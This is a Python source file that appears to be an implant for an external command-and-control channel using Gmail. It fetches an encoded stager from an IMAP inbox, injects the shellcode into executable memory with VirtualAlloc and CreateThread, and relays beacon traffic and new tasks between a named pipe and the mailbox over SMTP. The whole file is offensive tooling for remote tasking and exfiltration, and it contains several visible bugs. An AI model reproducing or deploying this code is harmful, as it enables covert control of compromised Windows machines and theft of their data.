from ctypes import *
from ctypes.wintypes import *
import struct
import sys
import os

# Encoder imports:
import base64
import urllib

# Transport imports:
import email
import imaplib
from smtplib import SMTP
from smtplib import SMTP_SSL
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from time import sleep


# START GHETTO CONFIG, should be read in when compiled...
GMAIL_USER = 'example@gmail.com'
GMAIL_PWD = 'hunter2'
SERVER = 'smtp.gmail.com'
#SERVER_PORT = 587
SERVER_PORT = 465
# END GHETTO CONFIG

# THIS SECTION (encoder and transport functions) WILL BE DYNAMICALLY POPULATED BY THE BUILDER FRAMEWORK
# <encoder functions>
def encode(data):
    data = base64.b64encode(data)
    return urllib.quote_plus(data)[::-1]

def decode(data):
    data = urllib.unquote(data[::-1])
    return base64.b64decode(data)
# </encoder functions>

# <transport functions>
def prepTransport():
    return 0

def sendData(data):
    msg = MIMEMultipart()
    msg['From'] = GMAIL_USER
    msg['To'] = GMAIL_USER
    msg['Subject'] = "Resp4You"
    message_content = encode(data)

    msg.attach(MIMEText(str(message_content)))

    while True:
        try:
            #mailServer = SMTP()
            mailServer = SMTP_SSL(SERVER, SERVER_PORT)
            # mailServer.connect(SERVER, SERVER_PORT)
            #mailServer.ehlo()
            #mailServer.starttls()
            mailServer.login(GMAIL_USER,GMAIL_PWD)
            mailServer.sendmail(GMAIL_USER, GMAIL_USER, msg.as_string())
            mailServer.quit()
            break
        except Exception as e:
            sleep(10) # wait 10 seconds to try again

def recvData():
    c= imaplib.IMAP4_SSL(SERVER)
    c.login(GMAIL_USER, GMAIL_PWD)
    c.select("INBOX")

    #typ, id_list = c.uid('search', None, "(UNSEEN SUBJECT 'New4You')".format(uniqueid))
    while True:
        typ, id_list = c.search(None, '(UNSEEN SUBJECT "New4You")')
        print id_list[0].split()
        if not id_list[0].split():
            sleep(10) # wait for 10 seconds before checking again
            c.select("INBOX")
            typ, id_list = c.search(None, '(UNSEEN SUBJECT "New4You")')
            pass
        else:
            for msg_id in id_list[0].split():
                msg = c.fetch(msg_id, '(RFC822)')
                #c.store(msg_id, '+FLAGS', '\SEEN')
                msg = ([x[0] for x in msg][1])[1]
                for part in email.message_from_string(msg).walk():
                    msg = part.get_payload()
                # print msg
                c.logout()
                return decode(msg)

# </transport functions>

MAXLEN = 1024*1024

def start_beacon(payload):
    shellcode =  bytearray(payload)
    buf = (c_char * len(shellcode)).from_buffer(shellcode)
    ptr = windll.kernel32.VirtualAlloc(c_int(0),
                                       c_int(len(shellcode)),
                                       c_int(0x3000), # MEM_COMMIT
                                       c_int(0x40)) # PAGE_EXECUTE_READWRITE
    
    windll.kernel32.RtlMoveMemory(c_int(ptr), buf, c_int(len(shellcode)))
    windll.kernel32.CreateThread(None, 0, c_int(ptr), None, 0, None)

# Open the handle to the pipe
def open_handle():
    GENERIC_READ = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    SECURITY_SQOS_PRESENT = 0x100000
    SECURITY_ANONYMOUS = 0x0
    while 1:
        pipe_handle = windll.kernel32.CreateFileA("\\\\.\\pipe\\foobar",
                                                  GENERIC_READ|GENERIC_WRITE,
                                                  0,
                                                  None,
                                                  OPEN_EXISTING,
                                                  SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS,
                                                  None)
        if pipe_handle != -1:
            break
    return pipe_handle
                                       
def read_frame2(handle):
    mem = create_string_buffer(MAXLEN)
    temp = c_int(0)
    total = c_int(0)
    size = c_int(0)
    #windll.kernel32.ReadFile(handle, mem, 4, byref(temp), None)
    #windll.kernel32.ReadFile(handle, size, 4, byref(temp), None)
    result, size = win32file.ReadFile(handle, 4, None)
    size = struct.unpack('<I', size)[0]
    sizeLeft = size
    while (total.value < size):
        # windll.kernel32.ReadFile(handle, mem, size - total, byref(temp), None)
        windll.kernel32.ReadFile(handle, mem, sizeLeft, byref(temp), None)
        sizeLeft = size - temp.value
        # total += temp
        total = c_long(total.value + temp.value)
    if size < 0: return (-1) # Nothing is in the pipe
    print "size is now: " + str(sizeLeft)
    chunk = mem.raw[:sizeLeft]
    return chunk

def read_frame(handle):
    result, size = win32file.ReadFile(handle, 4, None)
    size = struct.unpack('<I', size)[0]
    result, chunk = win32file.ReadFile(handle, size, None)
    return chunk

def ReadPipe(handle):
    return read_frame(handle)

def write_frame2(handle, chunk, chunklen):
    wrote = c_int(0)
    windll.kernel32.WriteFile(handle, c_int(chunklen), 4, byref(wrote), None) # Write the size of the chunk
    return windll.kernel32.WriteFile(handle, c_char_p(chunk), c_int(chunklen), byref(wrote), None) # Write the actual chunk

def write_frame(handle, chunk, chunklen):
    propersize = struct.pack('<I', chunklen)[0]
    win32file.WriteFile(handle, propersize, None)
    return win32file.WriteFile(handle, chunk, None)

def WritePipe(handle,chunk):
    print "Writing to pipe: %s" %(chunk)
    return write_frame(handle, chunk, len(chunk))

def go():
    # LOGIC TO RETRIEVE DATA VIA THE SOCKET (w/ 'recvData') GOES HERE
    print "Waiting for stager..." # DEBUG
    p = recvData()
    print "Got a stager! loading..."
    sleep(2)
    # print "Decoded stager = " + str(p) # DEBUG
    # Here they're writing the shellcode to the file, instead, we'll just send that to the handle...
    handle_beacon = start_beacon(p)

    # Grabbing and relaying the metadata from the SMB pipe is done during interact()
    print "Loaded, and got handle to beacon. Getting METADATA."

    return handle_beacon

def interact(handle_beacon):
    try:
        while(True):
            sleep(1.5)
            
            # LOGIC TO CHECK FOR A CHUNK FROM THE BEACON
            chunk = ReadPipe(handle_beacon)
            if chunk < 0:
                print 'readpipe %d' % (len(chunk))
                break
            else:
                print "Received %d bytes from pipe" % (len(chunk))
            print "relaying chunk to server"
            sendData(chunk)

            # LOGIC TO CHECK FOR A NEW TASK
            print "Checking for new tasks from transport"
            
            newTask = recvData()

            print "Got new task: %s" % (newTask)
            print "Writing %s bytes to pipe" % (len(newTask))
            r = WritePipe(handle_beacon, newTask)
            print "Write %s bytes to pipe" % (r)
    except KeyboardInterrupt:
    print "Caught escape signal"
    sys.exit(0)


# Prepare the transport module
prepTransport()

#Get and inject the stager
handle_beacon = go()

# run the main loop

interact(handle_beacon)
